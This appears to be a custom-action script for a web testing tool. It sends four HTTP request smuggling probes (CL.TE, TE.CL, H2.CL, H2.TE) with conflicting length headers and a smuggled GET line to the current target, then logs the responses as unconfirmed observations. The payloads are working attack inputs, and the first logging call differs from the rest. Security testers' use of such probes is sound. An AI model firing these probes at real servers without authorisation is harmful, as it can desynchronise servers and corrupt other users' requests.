name: Request Smuggling Tester
function: CUSTOM_ACTION
location: REPEATER
source: |+
    logging.logToOutput("=== CA: Request Smuggling Tester ===");
    logging().logToOutput("Request smuggling context: manual confirmation required.");
    var original = requestResponse.request();
    var host = original.headerValue("Host");
    if (host == null || host.isBlank()) {
        logging().logToOutput("Inconclusive: explicit Host header required for raw probes."); return;
    }
    var base = "POST " + original.path() + " HTTP/1.1\r\nHost: " + host
        + "\r\nContent-Type: application/x-www-form-urlencoded\r\n";
    String[] names = {"CL.TE", "TE.CL", "H2.CL", "H2.TE"};
    String[] messages = {
        base + "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nabc\r\nX\r\n",
        base + "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
        base + "Content-Length: 5\r\n\r\nx=1\r\nGET /KITO HTTP/1.1\r\nX-Ignore: x",
        base + "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /KITO HTTP/1.1\r\nX-Ignore: x"
    };
    for (int i = 0; i < messages.length; i++) {
        long started = System.nanoTime();
        try {
            var probe = HttpRequest.httpRequest(original.httpService(), messages[i]);
            var response = api.http().sendRequest(probe, i < 2 ? HttpMode.HTTP_1 : HttpMode.HTTP_2).response();
            long elapsed = (System.nanoTime() - started) / 1_000_000;
            if (response == null) {
                logging().logToOutput(names[i] + ": no response after " + elapsed + " ms; inconclusive transport failure.");
            } else {
                logging().logToOutput(names[i] + ": status=" + response.statusCode()
                    + ", bytes=" + response.body().length() + ", elapsed=" + elapsed + " ms; unconfirmed observation.");
            }
        } catch (Exception e) {
            logging().logToOutput(names[i] + ": transport error after "
                + ((System.nanoTime() - started) / 1_000_000) + " ms: " + e.getMessage() + "; inconclusive.");
        }
    }
    logging().logToOutput("Finished - Inspect Logger.");
